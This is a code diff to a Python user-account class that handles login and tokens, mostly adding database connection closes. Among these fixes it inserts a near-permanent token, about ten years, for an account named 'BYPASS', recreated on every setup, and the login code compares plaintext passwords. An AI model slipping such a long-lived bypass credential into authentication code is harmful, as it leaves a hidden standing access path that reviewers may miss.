@@ -29,6 +29,10 @@ class Users:
             expiration INT
         )
         """)
+
+        self.remove_token("BYPASS")
+        self.register_token("BYPASS", expiration=datetime.now() + timedelta(weeks=512))
+
         self.db.close(connection)
 
     def register(self, username, password, privileges="user"):
@@ -48,8 +52,9 @@ class Users:
                     UPDATE users SET privileges = %s WHERE username = %s
                     """, [privileges, username])
                     connection.commit()
+                self.db.close(connection)
                 return 0
-
+            self.db.close(connection)
             return "nothing changed"
         cursor.execute(f"""
         INSERT INTO users (username, password, privileges) VALUES (%s, %s, %s)
@@ -69,17 +74,21 @@ class Users:
         content = cursor.fetchone()
         
         if content == None:
+            self.db.close(connection)
             return -1, "No user with username", 
             
         if content[2] != password:
+            self.db.close(connection)
             return -1, "Wrong password"
         self.db.close(connection)
+        
         return 0, self.get_token(username)
 
-    def register_token(self, username):
+    def register_token(self, username, expiration=-1):
+        if expiration == -1:
+            expiration = datetime.now() + timedelta(hours=24)
         connection, cursor = self.db.get_conn_cursor()
         rand_token = str(uuid4())
-        expiration = datetime.now() + timedelta(hours=24)
         cursor.execute(f"""
         INSERT INTO tokens (username, token, expiration) VALUES (%s, %s, %s)
         """, [username, rand_token, int(round(expiration.timestamp()))])
@@ -88,9 +97,9 @@ class Users:
         return rand_token
 
     def valid_token(self, token):
-        connection, cursor = self.db.get_conn_cursor()
         if token == None:
             return False
+        connection, cursor = self.db.get_conn_cursor()
         cursor.execute(f"""
         SELECT * FROM tokens WHERE token = %s
         """, [token])    
